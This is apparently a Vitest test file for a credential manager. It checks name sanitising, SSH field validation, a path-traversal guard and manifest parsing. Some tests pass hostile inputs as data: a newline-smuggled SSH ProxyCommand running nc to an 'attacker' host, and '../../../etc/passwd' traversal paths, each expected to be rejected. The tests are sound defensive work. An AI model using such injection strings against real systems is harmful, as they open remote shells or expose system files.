import { describe, it, expect } from "vitest";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { _testing } from "./credential-manager.js";
import { resolveUnderDir } from "../shared/path-utils.js";

const { safeName, sanitizeSshField, readManifest } = _testing;

// ---------------------------------------------------------------------------
// safeName
// ---------------------------------------------------------------------------

describe("safeName", () => {
  it("keeps alphanumeric, hyphens, and underscores", () => {
    expect(safeName("my-cluster_01")).toBe("my-cluster_01");
  });

  it("replaces special characters with underscores", () => {
    expect(safeName("prod@us-east/1")).toBe("prod_us-east_1");
  });

  it("trims leading and trailing underscores", () => {
    expect(safeName("...name...")).toBe("name");
  });

  it("throws on empty string", () => {
    expect(() => safeName("")).toThrow("at least one alphanumeric");
  });

  it("throws when all characters are special", () => {
    expect(() => safeName("@#$%")).toThrow("at least one alphanumeric");
  });
});

// ---------------------------------------------------------------------------
// sanitizeSshField
// ---------------------------------------------------------------------------

describe("sanitizeSshField", () => {
  it("passes clean values through", () => {
    expect(sanitizeSshField("192.168.1.1", "host")).toBe("192.168.1.1");
  });

  it("trims whitespace", () => {
    expect(sanitizeSshField("  root  ", "username")).toBe("root");
  });

  it("throws on empty value", () => {
    expect(() => sanitizeSshField("", "host")).toThrow("host must not be empty");
  });

  it("throws on whitespace-only value", () => {
    expect(() => sanitizeSshField("   ", "host")).toThrow("host must not be empty");
  });

  it("rejects newline injection", () => {
    expect(() => sanitizeSshField("evil.com\n  ProxyCommand nc attacker 1234", "host"))
      .toThrow("host must not contain newlines");
  });

  it("rejects carriage return injection", () => {
    expect(() => sanitizeSshField("evil.com\r\nProxyCommand bad", "host"))
      .toThrow("host must not contain newlines");
  });
});

// ---------------------------------------------------------------------------
// resolveUnderDir
// ---------------------------------------------------------------------------

describe("resolveUnderDir", () => {
  const credDir = "/tmp/test-creds";

  it("allows normal filenames", () => {
    expect(resolveUnderDir(credDir, "cluster.kubeconfig"))
      .toBe(path.join(credDir, "cluster.kubeconfig"));
  });

  it("blocks ../ traversal", () => {
    expect(() => resolveUnderDir(credDir, "../../../etc/passwd"))
      .toThrow("Path escapes base directory");
  });

  it("blocks absolute path escape", () => {
    expect(() => resolveUnderDir(credDir, "/etc/passwd"))
      .toThrow("Path escapes base directory");
  });
});

// ---------------------------------------------------------------------------
// readManifest
// ---------------------------------------------------------------------------

describe("readManifest", () => {
  it("returns empty array for non-existent directory", () => {
    expect(readManifest("/tmp/nonexistent-cred-dir-" + Date.now())).toEqual([]);
  });

  it("returns empty array for corrupted manifest", () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "cred-test-"));
    try {
      fs.writeFileSync(path.join(tmpDir, "manifest.json"), "not json");
      expect(readManifest(tmpDir)).toEqual([]);
    } finally {
      fs.rmSync(tmpDir, { recursive: true });
    }
  });

  it("returns empty array for non-array manifest", () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "cred-test-"));
    try {
      fs.writeFileSync(path.join(tmpDir, "manifest.json"), '{"name":"bad"}');
      expect(readManifest(tmpDir)).toEqual([]);
    } finally {
      fs.rmSync(tmpDir, { recursive: true });
    }
  });

  it("reads valid manifest", () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "cred-test-"));
    try {
      const entries = [{ name: "test", type: "kubeconfig", files: ["test.kubeconfig"] }];
      fs.writeFileSync(path.join(tmpDir, "manifest.json"), JSON.stringify(entries));
      expect(readManifest(tmpDir)).toEqual(entries);
    } finally {
      fs.rmSync(tmpDir, { recursive: true });
    }
  });
});
